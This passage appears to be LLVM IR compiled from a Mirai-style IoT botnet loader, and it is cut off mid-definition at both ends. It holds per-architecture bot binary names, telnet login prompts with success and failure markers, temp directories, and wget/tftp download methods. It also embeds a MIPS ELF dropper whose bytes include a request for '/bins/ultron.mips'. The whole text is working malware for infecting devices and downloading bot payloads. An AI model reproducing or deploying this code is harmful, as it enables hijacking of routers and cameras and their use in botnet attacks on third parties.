getelementptr inbounds ([13 x i8], [13 x i8]* @.str.205, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.206, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.207, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.208, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.209, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.210, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.211, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.212, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.213, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.214, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.215, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.216, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.217, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.218, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.219, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.220, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.221, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.222, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.223, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.224, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.225, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.226, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.227, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.228, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.229, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.230, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.231, i32 0, i32 0)], align 16
@.str.63 = private unnamed_addr constant [5 x i8] c"mips\00", align 1
@.str.64 = private unnamed_addr constant [7 x i8] c"mipsel\00", align 1
@.str.65 = private unnamed_addr constant [4 x i8] c"sh4\00", align 1
@.str.66 = private unnamed_addr constant [4 x i8] c"x86\00", align 1
@.str.67 = private unnamed_addr constant [5 x i8] c"i686\00", align 1
@.str.68 = private unnamed_addr constant [4 x i8] c"ppc\00", align 1
@.str.69 = private unnamed_addr constant [5 x i8] c"i586\00", align 1
@.str.70 = private unnamed_addr constant [11 x i8] c"jackmymips\00", align 1
@.str.71 = private unnamed_addr constant [13 x i8] c"jackmymips64\00", align 1
@.str.72 = private unnamed_addr constant [13 x i8] c"jackmymipsel\00", align 1
@.str.73 = private unnamed_addr constant [12 x i8] c"jackmysh2eb\00", align 1
@.str.74 = private unnamed_addr constant [13 x i8] c"jackmysh2elf\00", align 1
@.str.75 = private unnamed_addr constant [10 x i8] c"jackmysh4\00", align 1
@.str.76 = private unnamed_addr constant [10 x i8] c"jackmyx86\00", align 1
@.str.77 = private unnamed_addr constant [12 x i8] c"jackmyarmv5\00", align 1
@.str.78 = private unnamed_addr constant [14 x i8] c"jackmyarmv4tl\00", align 1
@.str.79 = private unnamed_addr constant [12 x i8] c"jackmyarmv4\00", align 1
@.str.80 = private unnamed_addr constant [12 x i8] c"jackmyarmv6\00", align 1
@.str.81 = private unnamed_addr constant [11 x i8] c"jackmyi686\00", align 1
@.str.82 = private unnamed_addr constant [14 x i8] c"jackmypowerpc\00", align 1
@.str.83 = private unnamed_addr constant [19 x i8] c"jackmypowerpc440fp\00", align 1
@.str.84 = private unnamed_addr constant [11 x i8] c"jackmyi586\00", align 1
@.str.85 = private unnamed_addr constant [11 x i8] c"jackmym68k\00", align 1
@.str.86 = private unnamed_addr constant [12 x i8] c"jackmysparc\00", align 1
@.str.87 = private unnamed_addr constant [11 x i8] c"hackmymips\00", align 1
@.str.88 = private unnamed_addr constant [13 x i8] c"hackmymipsel\00", align 1
@.str.89 = private unnamed_addr constant [10 x i8] c"hackmysh4\00", align 1
@.str.90 = private unnamed_addr constant [10 x i8] c"hackmyx86\00", align 1
@.str.91 = private unnamed_addr constant [12 x i8] c"hackmyarmv6\00", align 1
@.str.92 = private unnamed_addr constant [11 x i8] c"hackmyi686\00", align 1
@.str.93 = private unnamed_addr constant [14 x i8] c"hackmypowerpc\00", align 1
@.str.94 = private unnamed_addr constant [11 x i8] c"hackmyi586\00", align 1
@.str.95 = private unnamed_addr constant [11 x i8] c"hackmym68k\00", align 1
@.str.96 = private unnamed_addr constant [12 x i8] c"hackmysparc\00", align 1
@.str.97 = private unnamed_addr constant [18 x i8] c"armarmv5larmv6lb1\00", align 1
@.str.98 = private unnamed_addr constant [3 x i8] c"b2\00", align 1
@.str.99 = private unnamed_addr constant [3 x i8] c"b3\00", align 1
@.str.100 = private unnamed_addr constant [3 x i8] c"b4\00", align 1
@.str.101 = private unnamed_addr constant [3 x i8] c"b5\00", align 1
@.str.102 = private unnamed_addr constant [3 x i8] c"b6\00", align 1
@.str.103 = private unnamed_addr constant [3 x i8] c"b7\00", align 1
@.str.104 = private unnamed_addr constant [3 x i8] c"b8\00", align 1
@.str.105 = private unnamed_addr constant [3 x i8] c"b9\00", align 1
@.str.106 = private unnamed_addr constant [17 x i8] c"busyboxterrorist\00", align 1
@.str.107 = private unnamed_addr constant [9 x i8] c"DFhxdhdf\00", align 1
@.str.108 = private unnamed_addr constant [10 x i8] c"dvrHelper\00", align 1
@.str.109 = private unnamed_addr constant [8 x i8] c"FDFDHFC\00", align 1
@.str.110 = private unnamed_addr constant [5 x i8] c"FEUB\00", align 1
@.str.111 = private unnamed_addr constant [9 x i8] c"FTUdftui\00", align 1
@.str.112 = private unnamed_addr constant [9 x i8] c"GHfjfgvj\00", align 1
@.str.113 = private unnamed_addr constant [13 x i8] c"jackmyarmv5l\00", align 1
@.str.114 = private unnamed_addr constant [13 x i8] c"jackmyarmv6l\00", align 1
@.str.115 = private unnamed_addr constant [11 x i8] c"jackmyarv6\00", align 1
@.str.116 = private unnamed_addr constant [6 x i8] c"jhUOH\00", align 1
@.str.117 = private unnamed_addr constant [9 x i8] c"JIPJIPJj\00", align 1
@.str.118 = private unnamed_addr constant [10 x i8] c"JIPJuipjh\00", align 1
@.str.119 = private unnamed_addr constant [10 x i8] c"kmyx86_64\00", align 1
@.str.120 = private unnamed_addr constant [10 x i8] c"lolmipsel\00", align 1
@.str.121 = private unnamed_addr constant [8 x i8] c"RYrydry\00", align 1
@.str.122 = private unnamed_addr constant [10 x i8] c"telarmv6l\00", align 1
@.str.123 = private unnamed_addr constant [8 x i8] c"telmips\00", align 1
@.str.124 = private unnamed_addr constant [10 x i8] c"telmipsel\00", align 1
@.str.125 = private unnamed_addr constant [7 x i8] c"telx86\00", align 1
@.str.126 = private unnamed_addr constant [14 x i8] c"TwoFacearmv61\00", align 1
@.str.127 = private unnamed_addr constant [12 x i8] c"TwoFacei586\00", align 1
@.str.128 = private unnamed_addr constant [12 x i8] c"TwoFacei686\00", align 1
@.str.129 = private unnamed_addr constant [12 x i8] c"TwoFacem86k\00", align 1
@.str.130 = private unnamed_addr constant [12 x i8] c"TwoFacemips\00", align 1
@.str.131 = private unnamed_addr constant [14 x i8] c"TwoFacemipsel\00", align 1
@.str.132 = private unnamed_addr constant [15 x i8] c"TwoFacepowerpc\00", align 1
@.str.133 = private unnamed_addr constant [11 x i8] c"TwoFacesh4\00", align 1
@.str.134 = private unnamed_addr constant [13 x i8] c"TwoFacesparc\00", align 1
@.str.135 = private unnamed_addr constant [14 x i8] c"TwoFacex86_64\00", align 1
@.str.136 = private unnamed_addr constant [9 x i8] c"UYyuyioy\00", align 1
@.str.137 = private unnamed_addr constant [5 x i8] c"wget\00", align 1
@.str = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.138 = private unnamed_addr constant [9 x i8] c"XDzdfxzf\00", align 1
@.str.139 = private unnamed_addr constant [5 x i8] c"xxb1\00", align 1
@.str.140 = private unnamed_addr constant [5 x i8] c"xxb2\00", align 1
@.str.141 = private unnamed_addr constant [5 x i8] c"xxb3\00", align 1
@.str.142 = private unnamed_addr constant [5 x i8] c"xxb4\00", align 1
@.str.143 = private unnamed_addr constant [5 x i8] c"xxb5\00", align 1
@.str.144 = private unnamed_addr constant [5 x i8] c"xxb6\00", align 1
@.str.145 = private unnamed_addr constant [5 x i8] c"xxb7\00", align 1
@.str.146 = private unnamed_addr constant [5 x i8] c"xxb8\00", align 1
@.str.147 = private unnamed_addr constant [5 x i8] c"xxb9\00", align 1
@.str.148 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.149 = private unnamed_addr constant [2 x i8] c"1\00", align 1
@.str.150 = private unnamed_addr constant [2 x i8] c"2\00", align 1
@.str.151 = private unnamed_addr constant [2 x i8] c"3\00", align 1
@.str.152 = private unnamed_addr constant [2 x i8] c"4\00", align 1
@.str.153 = private unnamed_addr constant [2 x i8] c"5\00", align 1
@.str.154 = private unnamed_addr constant [2 x i8] c"6\00", align 1
@.str.155 = private unnamed_addr constant [2 x i8] c"7\00", align 1
@.str.156 = private unnamed_addr constant [2 x i8] c"8\00", align 1
@.str.157 = private unnamed_addr constant [2 x i8] c"9\00", align 1
@.str.158 = private unnamed_addr constant [3 x i8] c"10\00", align 1
@.str.159 = private unnamed_addr constant [3 x i8] c"11\00", align 1
@.str.160 = private unnamed_addr constant [3 x i8] c"12\00", align 1
@.str.161 = private unnamed_addr constant [3 x i8] c"13\00", align 1
@.str.162 = private unnamed_addr constant [3 x i8] c"14\00", align 1
@.str.163 = private unnamed_addr constant [3 x i8] c"15\00", align 1
@.str.164 = private unnamed_addr constant [3 x i8] c"16\00", align 1
@.str.165 = private unnamed_addr constant [3 x i8] c"17\00", align 1
@.str.166 = private unnamed_addr constant [3 x i8] c"18\00", align 1
@.str.167 = private unnamed_addr constant [3 x i8] c"19\00", align 1
@.str.168 = private unnamed_addr constant [10 x i8] c"20botmips\00", align 1
@.str.169 = private unnamed_addr constant [10 x i8] c"botmipsel\00", align 1
@.str.170 = private unnamed_addr constant [7 x i8] c"botsh4\00", align 1
@.str.171 = private unnamed_addr constant [10 x i8] c"botx86_64\00", align 1
@.str.172 = private unnamed_addr constant [10 x i8] c"botarmv6l\00", align 1
@.str.173 = private unnamed_addr constant [8 x i8] c"boti686\00", align 1
@.str.174 = private unnamed_addr constant [11 x i8] c"botpowerpc\00", align 1
@.str.175 = private unnamed_addr constant [8 x i8] c"boti586\00", align 1
@.str.176 = private unnamed_addr constant [8 x i8] c"botm68k\00", align 1
@.str.177 = private unnamed_addr constant [9 x i8] c"botsparc\00", align 1
@.str.178 = private unnamed_addr constant [10 x i8] c"botarmv4l\00", align 1
@.str.179 = private unnamed_addr constant [10 x i8] c"botarmv5l\00", align 1
@.str.180 = private unnamed_addr constant [28 x i8] c"botpowerpc440fpbotmipsfinal\00", align 1
@.str.181 = private unnamed_addr constant [15 x i8] c"botmipselfinal\00", align 1
@.str.182 = private unnamed_addr constant [12 x i8] c"botsh4final\00", align 1
@.str.183 = private unnamed_addr constant [15 x i8] c"botx86_64final\00", align 1
@.str.184 = private unnamed_addr constant [15 x i8] c"botarmv6lfinal\00", align 1
@.str.185 = private unnamed_addr constant [13 x i8] c"boti686final\00", align 1
@.str.186 = private unnamed_addr constant [16 x i8] c"botpowerpcfinal\00", align 1
@.str.187 = private unnamed_addr constant [13 x i8] c"boti586final\00", align 1
@.str.188 = private unnamed_addr constant [13 x i8] c"botm68kfinal\00", align 1
@.str.189 = private unnamed_addr constant [14 x i8] c"botsparcfinal\00", align 1
@.str.190 = private unnamed_addr constant [15 x i8] c"botarmv4lfinal\00", align 1
@.str.191 = private unnamed_addr constant [15 x i8] c"botarmv5lfinal\00", align 1
@.str.192 = private unnamed_addr constant [21 x i8] c"botpowerpc440fpfinal\00", align 1
@.str.193 = private unnamed_addr constant [10 x i8] c"mirai.x86\00", align 1
@.str.194 = private unnamed_addr constant [11 x i8] c"mirai.mips\00", align 1
@.str.195 = private unnamed_addr constant [11 x i8] c"mirai.mpsl\00", align 1
@.str.196 = private unnamed_addr constant [10 x i8] c"mirai.arm\00", align 1
@.str.197 = private unnamed_addr constant [12 x i8] c"mirai.arm5n\00", align 1
@.str.198 = private unnamed_addr constant [11 x i8] c"mirai.arm7\00", align 1
@.str.199 = private unnamed_addr constant [10 x i8] c"mirai.ppc\00", align 1
@.str.200 = private unnamed_addr constant [10 x i8] c"mirai.spc\00", align 1
@.str.201 = private unnamed_addr constant [11 x i8] c"mirai.m68k\00", align 1
@.str.202 = private unnamed_addr constant [10 x i8] c"mirai.sh4\00", align 1
@.str.203 = private unnamed_addr constant [12 x i8] c"miraint.x86\00", align 1
@.str.204 = private unnamed_addr constant [13 x i8] c"miraint.mips\00", align 1
@.str.205 = private unnamed_addr constant [13 x i8] c"miraint.mpsl\00", align 1
@.str.206 = private unnamed_addr constant [12 x i8] c"miraint.arm\00", align 1
@.str.207 = private unnamed_addr constant [14 x i8] c"miraint.arm5n\00", align 1
@.str.208 = private unnamed_addr constant [13 x i8] c"miraint.arm7\00", align 1
@.str.209 = private unnamed_addr constant [12 x i8] c"miraint.ppc\00", align 1
@.str.210 = private unnamed_addr constant [12 x i8] c"miraint.spc\00", align 1
@.str.211 = private unnamed_addr constant [13 x i8] c"miraint.m68k\00", align 1
@.str.212 = private unnamed_addr constant [19 x i8] c"miraint.sh4bot.x86\00", align 1
@.str.213 = private unnamed_addr constant [9 x i8] c"bot.mips\00", align 1
@.str.214 = private unnamed_addr constant [9 x i8] c"bot.mpsl\00", align 1
@.str.215 = private unnamed_addr constant [8 x i8] c"bot.arm\00", align 1
@.str.216 = private unnamed_addr constant [10 x i8] c"bot.arm5n\00", align 1
@.str.217 = private unnamed_addr constant [9 x i8] c"bot.arm7\00", align 1
@.str.218 = private unnamed_addr constant [8 x i8] c"bot.ppc\00", align 1
@.str.219 = private unnamed_addr constant [8 x i8] c"bot.spc\00", align 1
@.str.220 = private unnamed_addr constant [9 x i8] c"bot.m68k\00", align 1
@.str.221 = private unnamed_addr constant [8 x i8] c"bot.sh4\00", align 1
@.str.222 = private unnamed_addr constant [10 x i8] c"botnt.x86\00", align 1
@.str.223 = private unnamed_addr constant [11 x i8] c"botnt.mips\00", align 1
@.str.224 = private unnamed_addr constant [11 x i8] c"botnt.mpsl\00", align 1
@.str.225 = private unnamed_addr constant [10 x i8] c"botnt.arm\00", align 1
@.str.226 = private unnamed_addr constant [12 x i8] c"botnt.arm5n\00", align 1
@.str.227 = private unnamed_addr constant [11 x i8] c"botnt.arm7\00", align 1
@.str.228 = private unnamed_addr constant [10 x i8] c"botnt.ppc\00", align 1
@.str.229 = private unnamed_addr constant [10 x i8] c"botnt.spc\00", align 1
@.str.230 = private unnamed_addr constant [11 x i8] c"botnt.m68k\00", align 1
@.str.231 = private unnamed_addr constant [10 x i8] c"botnt.sh4\00", align 1
@buf = common local_unnamed_addr global i8 0, align 1
@input = common global [1024 x i8] zeroinitializer, align 16
@output = common global [1024 x i8] zeroinitializer, align 16
@advances = global [7 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.236, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.237, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.238, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.239, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.240, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.241, i32 0, i32 0), i8* null], align 16
@.str.236 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.237 = private unnamed_addr constant [5 x i8] c"user\00", align 1
@.str.238 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.239 = private unnamed_addr constant [5 x i8] c"name\00", align 1
@.str.240 = private unnamed_addr constant [5 x i8] c"pass\00", align 1
@.str.241 = private unnamed_addr constant [7 x i8] c"dvrdvs\00", align 1
@fails = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.248, i32 0, i32 0), i8* null], align 16
@.str.242 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.243 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.244 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.245 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.246 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.247 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.248 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@successes = global [6 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.251, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.252, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.241, i32 0, i32 0), i8* null], align 16
@.str.249 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.250 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.251 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@.str.252 = private unnamed_addr constant [6 x i8] c"shell\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.242, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.243, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.244, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.245, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.246, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.247, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.248, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.249, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.250, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.251, i32 0, i32 0), i8* null], align 16
@tmp_dirs = local_unnamed_addr global [6 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.253, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.254, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.255, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.256, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.257, i32 0, i32 0), i8* null], align 16
@.str.253 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.254 = private unnamed_addr constant [9 x i8] c"/var/tmp\00", align 1
@.str.255 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.256 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.257 = private unnamed_addr constant [9 x i8] c"/var/run\00", align 1
@checkmethod = global [3 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.258, i32 0, i32 0), i8* null], align 16
@.str.258 = private unnamed_addr constant [5 x i8] c"tftp\00", align 1
@archs = global [2 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.259, i32 0, i32 0), i8* null], align 16
@.str.259 = private unnamed_addr constant [7 x i8] c"armv5l\00", align 1
@arch_arm = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.259, i32 0, i32 0), i8* null], align 16
@echo = global [2 x i8*] [i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.260, i32 0, i32 0), i8* null], align 16
@.str.260 = private unnamed_addr constant [19 x i8] c": applet not found\00", align 1
@wget = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.137, i32 0, i32 0), i8* null], align 16
@tftp = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.258, i32 0, i32 0), i8* null], align 16
@pids = common local_unnamed_addr global i32* null, align 8
@ourIP = common local_unnamed_addr global %struct.in_addr zeroinitializer, align 4
@dropper_mips = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([2001 x i8], [2001 x i8]* @.str.264, i32 0, i32 0), i8* null], align 16
@.str.264 = private unnamed_addr constant [2001 x i8] c"\7FELF\01\02\01\00\00\00\00\00\00\00\00\00\00\02\00\08\00\00\00\01\00@\04\C0\00\00\004\00\00\06\B8\00\00\10\07\004\00 \00\03\00(\00\07\00\06\00\00\00\01\00\00\00\00\00@\00\00\00@\00\00\00\00\060\00\00\060\00\00\00\05\00\01\00\00\00\00\00\01\00\00\060\00D\060\00D\060\00\00\00T\00\00\00p\00\00\00\06\00\01\00\00dt\E5Q\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\000\A5\00\FF\00\05,\00\00\04&\00\00\85 %0\C2\00\FF0\E7\00\FF\00\87 %\00\02\12\00\03\E0\00\08\00D\10%<\1C\00\05'\9C\85X\03\99\E0!\8F\99\80\5C\00\80(!\03 \00\08$\04\0F\A1<\1C\00\05'\9C\85<\03\99\E0!\8F\99\80\5C\00\80(!\03 \00\08$\04\0F\A6<\1C\00\05'\9C\85 \03\99\E0!\00\A0\10!\8F\99\80\5C\00\C08!\00\80(!\00@0!\03 \00\08$\04\0F\A5<\1C\00\05'\9C\84\F8\03\99\E0!'\BD\FF\D0\AF\BF\00(\AF\BC\00\10\8F\99\80\5C\AF\A4\00\18\AF\A5\00\1C\AF\A6\00 $\04\10\06'\A6\00\18\03 \F8\09$\05\00\03\8F\BC\00\10\8F\BF\00(\00\00\00\00\03\E0\00\08'\BD\000<\1C\00\05'\9C\84\AC\03\99\E0!\00\A0\10!\8F\99\80\5C\00\C08!\00\80(!\00@0!\03 \00\08$\04\0F\A4<\1C\00\05'\9C\84\84\03\99\E0!\00\A0\10!\8F\99\80\5C\00\C08!\00\80(!\00@0!\03 \00\08$\04\0F\A3<\1C\00\05'\9C\84\5C\03\99\E0!'\BD\FF\D0\AF\BF\00(\AF\BC\00\10\8F\99\80\5C\AF\A4\00\18\AF\A5\00\1C\AF\A6\00 $\04\10\06'\A6\00\18\03 \F8\09$\05\00\01\8F\BC\00\10\8F\BF\00(\00\00\00\00\03\E0\00\08'\BD\000<\1C\00\05'\9C\84\10\03\99\E0!'\BD\FF8\AF\BF\00\C0\AF\B3\00\BC\AF\B2\00\B8\AF\B1\00\B4\AF\B0\00\B0\AF\BC\00\10\8F\82\80\18\00\00\00\00$P\05\E0\82\02\00\00\00\00\00\00\14@\FF\FD&\10\00\01&\10\FF\FF\8F\85\80\18\8F\82\80\18\8F\99\80H$\A5\05\E8$\04\00\01$\06\00\07$B\05\E0\03 \F8\09\02\02\98#\8F\BC\00\10$\02\00\02\8F\99\80L\A7\A2\00\1C$\02\00P$\07\00\D9$\04\00\A8$\05\00\EB$\06\00R\03 \F8\09\A7\A2\00\1E\8F\BC\00\10$\05\03\01\8F\84\80\18\8F\99\80`$\84\05\F0$\06\01\FF\03 \F8\09\AF\A2\00 \8F\BC\00\10$\04\00\02\8F\99\80P$\05\00\02\00\000!\03 \F8\09\00@\90!\00@\88!$\02\FF\FF\8F\BC\00\10\12\22\00\03\00\00\00\00\16B\00\07\00\00\00\00\8F\99\80T\00\00\00\00\03 \F8\09$\04\00\01\8F\BC\00\10\00\00\00\00\8F\99\80D\02  !'\A5\00\1C\03 \F8\09$\06\00\10\8F\BC\00\10\04A\00\0F\00@\80!\8F\85\80\18\8F\99\80H$\A5\05\FC$\04\00\01\03 \F8\09$\06\00\04\8F\BC\00\10\00\00\00\00\8F\99\80T\00\00\00\00\03 \F8\09\00\10 #\8F\BC\00\10\00\00\00\00\8F\85\80\18\8F\99\80H&p\00\1D$\A5\06\04\02  !\03 \F8\09\02\000!\8F\BC\00\10\10P\00\07\00\00\80!\8F\99\80T\00\00\00\00\03 \F8\09$\04\00\03\8F\BC\00\10\00\00\80!\8F\99\808\02  !'\A5\00\18\03 \F8\09$\06\00\01\8F\BC\00\10$\03\00\01\8F\99\80T\10C\00\04$\04\00\04\03 \F8\09\00\00\00\00\8F\BC\00\10\83\A3\00\18\00\10\12\00\00C\80%<\02\0D\0A4B\0D\0A\16\02\FF\ED\00\00\00\00\8F\99\808'\B0\00,\02  !\02\00(!\03 \F8\09$\06\00\80\8F\BC\00\10\02\00(!\8F\99\80H\00@0!\18@\00\06\02@ !\03 \F8\09\00\00\00\00\8F\BC\00\10\10\00\FF\F0\00\00\00\00\8F\99\80X\00\00\00\00\03 \F8\09\02  !\8F\BC\00\10\00\00\00\00\8F\99\80X\00\00\00\00\03 \F8\09\02@ !\8F\BC\00\10$\04\00\01\8F\85\80\18\8F\99\80H$\A5\06(\03 \F8\09$\06\00\04\8F\BC\00\10\00\00\00\00\8F\99\80T\00\00\00\00\03 \F8\09$\04\00\05\8F\BC\00\10\8F\BF\00\C0\8F\B3\00\BC\8F\B2\00\B8\8F\B1\00\B4\8F\B0\00\B0\03\E0\00\08'\BD\00\C8<\1C\00\05'\9C\81`\03\99\E0!\03\E0\00!\04\11\00\01\00\00\00\00<\1C\00\05'\9C\81H\03\9F\E0!\00\00\F8!\8F\99\80<\00\00\00\00\03 \00\08\00\00\00\00\00\00\00\00\00\00\00\00<\1C\00\05'\9C\81 \03\99\E0!\00\80\10!\00\A0 !\00\C0(!\00\E00!\8F\A7\00\10\8F\A8\00\14\8F\A9\00\18\8F\AA\00\1C'\BD\FF\E0\AF\A8\00\10\AF\A9\00\14\AF\AA\00\18\AF\A2\00\1C\8F\A2\00\1C\00\00\00\0C\14\E0\00\03'\BD\00 \03\E0\00\08\00\00\00\00\00@ !\8F\99\80@\00\00\00\00\03 \00\08\00\00\00\00\00\00\00\00<\1C\00\05'\9C\80\B0\03\99\E0!'\BD\FF\E0\AF\BF\00\1C\AF\B0\00\18\AF\BC\00\10\8F\99\804\00\00\00\00\03 \F8\09\00\80\80!\8F\BC\00\10\ACP\00\00\8F\BF\00\1C\8F\B0\00\18$\02\FF\FF\03\E0\00\08'\BD\00 \00\00\00\00\00\00\00\00<\1C\00\05'\9C\80`\03\99\E0!\8F\82\800\03\E0\00\08\00\00\00\00\00\00\00\00\00\00\00\00mips\00\00\00\00ULTRON\0A\00dvrHelper\00\00\00NIF\0A\00\00\00\00GET /bins/ultron.mips HTTP/1.0\0D\0A\0D\0A\00\00FIN\0A\00\00\00\00\00\00\00\00\80\00\00\00\00@\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00D\06\90\00@\05\C0\00@\01\9C\00@\02\10\00@\05p\00@\01(\00@\01t\00@\00\A0\00@\01\C4\00@\00\C8\00@\00\E4\00@\05\00\00@\01\00\00.shstrtab\00.text\00.rodata\00.got\00.bss\00.mdebug.abi32\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00@\00\A0\00\00\00\A0\00\00\05@\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00@\05\E0\00\00\05\E0\00\00\00P\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\01\10\00\00\03\00D\060\00\00\060\00\00\00T\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\04\00\00\00\1E\00\00\00\08\00\00\00\03\00D\06\90\00\00\06\84\00\00\00\10\00\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00#\00\00\00\01\00\00\00\00\00\00\00H\00\00\06\84\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\06\84\00\00\001\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00", align 1
@dropper_mipsel = local_unnamed_addr global [2 x i8*] [i8* getelementptr inbounds ([2049 x i8], [2049 x i8]* @.str.265, i32 0, i32 0), i8* null], align 16
